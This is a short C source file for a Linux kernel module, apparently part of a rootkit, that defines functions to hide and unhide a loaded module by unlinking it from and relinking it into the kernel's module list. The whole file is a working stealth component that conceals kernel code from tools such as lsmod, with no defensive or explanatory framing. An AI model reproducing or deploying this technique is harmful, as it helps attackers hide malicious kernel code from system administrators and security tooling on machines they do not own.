#include <linux/module.h>
#include <linux/list.h>
#include "invisibility.h"


int make_module_invisible(struct module *module)
{
    struct list_head *next, *prev;
    next = module->list.next;
    prev = module->list.prev;

    if (!next || !prev)
        return -1;

    prev->next = next;
    next->prev = prev;
    return 0;
}

int make_module_visible(struct module *module)
{
    struct list_head *next, *prev;
    next = module->list.next;
    prev = module->list.prev;

    if (!next || !prev)
        return -1;

    next->prev = &module->list;
    prev->next = &module->list;
    return 0;
}

